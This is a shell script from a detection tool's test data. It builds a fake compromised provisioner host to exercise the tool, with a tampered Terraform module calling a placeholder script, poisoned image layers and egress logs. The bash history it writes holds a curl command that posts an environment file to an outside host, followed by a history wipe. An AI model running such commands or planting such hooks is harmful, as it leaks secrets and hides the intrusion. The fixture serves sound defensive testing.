#!/bin/sh
# Copyright 2026 Optimus Labs (Civilizations research team). Apache-2.0.
#
# Builds a synthetic COMPROMISED provisioner host under $1 for `make demo` and the
# integration test. Nothing here is a real payload: the harvester scripts are not
# reproduced (their hashes are the only thing the tool needs), so no file in the
# fixture matches a published hash. What IS planted is every OTHER indicator the
# advisory names, which is why this output is never committed -- the strings can
# trip corporate EDR. Run it in a throwaway VM or container.
#
#   ./testdata/make_fixture.sh /tmp/leakpatrol-fixture
set -eu

root="${1:?usage: make_fixture.sh <dir>}"
rm -rf "$root"
mkdir -p "$root/home" "$root/provisioner/work/.terraform/modules/aider" "$root/logs" "$root/img/layer1"

# The tampered module: the data block that invoked the harvester.
cat > "$root/provisioner/work/.terraform/modules/aider/main.tf" <<'EOF'
terraform {
  required_providers {
    coder = { source = "coder/coder" }
  }
}

data "external" "telemetry" {
  program = ["sh", "${path.module}/dlp.sh"]
}

resource "coder_script" "aider" {
  agent_id = var.agent_id
  script   = "echo aider"
}
EOF

# A file NAMED like the harvester whose bytes are not the harvester. The tool must
# report it as a weak filename match, never as a hash match.
printf '#!/bin/sh\n# placeholder -- not the payload\necho ok\n' > "$root/provisioner/work/.terraform/modules/aider/dlp.sh"

# The exfil call, as it would sit in a shell history on the provisioner.
cat > "$root/home/.bash_history" <<'EOF'
ls -la
terraform init
curl -s -X POST -H 'X-CLI-Token: your-secret-token' --data-binary @/tmp/env.txt http://www.coder-infra.com/cli/check
history -c
EOF

# Egress logs: a firewall export (gzipped) and a DNS log (plain).
cat > "$root/logs/fw.log" <<'EOF'
2026-08-31T09:12:44Z ALLOW TCP 10.0.3.17:51322 -> 199.91.220.205:80 bytes=18342
2026-08-31T09:12:45Z ALLOW TCP 10.0.3.17:51323 -> 140.82.112.3:443 bytes=1201
2026-08-31T09:13:02Z ALLOW TCP 10.0.3.17:51330 -> 199.91.220.205:80 bytes=20115
EOF
gzip -kf "$root/logs/fw.log"
cat > "$root/logs/dns.log" <<'EOF'
2026-08-31 09:12:43 client 10.0.3.17#51322: query: www.coder-infra.com IN A
2026-08-31 09:12:45 client 10.0.3.17#51323: query: github.com IN A
EOF

# A docker-save-layout image tar whose single layer carries the tampered module.
mkdir -p "$root/img/layer1/opt/coder/modules/zed"
cp "$root/provisioner/work/.terraform/modules/aider/main.tf" "$root/img/layer1/opt/coder/modules/zed/main.tf"
( cd "$root/img/layer1" && tar -cf ../layer.tar . )
mkdir -p "$root/img/abc123def456"
mv "$root/img/layer.tar" "$root/img/abc123def456/layer.tar"
printf '[{"Config":"cfg.json","RepoTags":["demo/provisioner:poisoned"],"Layers":["abc123def456/layer.tar"]}]\n' > "$root/img/manifest.json"
( cd "$root/img" && tar -cf ../image.tar manifest.json abc123def456 )
rm -rf "$root/img"

echo "$root"
